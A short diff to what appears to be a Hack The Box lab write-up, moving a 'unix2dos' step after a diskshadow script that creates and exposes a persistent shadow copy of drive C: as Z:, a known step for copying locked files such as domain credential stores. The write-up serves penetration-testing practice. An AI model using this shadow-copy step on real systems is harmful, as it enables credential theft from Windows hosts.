@@ -208,15 +208,15 @@ diskshadow /s c:\programdata\vss.dsh
 ![image](https://github.com/regarmulia/HTB/assets/33616880/95425630-c31e-492a-9b94-1ddcd202f19d)
 
 ```
-unix2dos vss.dsh
-```
-```
 set context persistent nowriters
 set metadata c:\programdata\df.cab
 set verbose on
 add volume c: alias df
 create
 expose %df% z:
+```
+```
+unix2dos vss.dsh
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/d2c6e1b2-b0fb-4966-b838-a601662324bb)
 
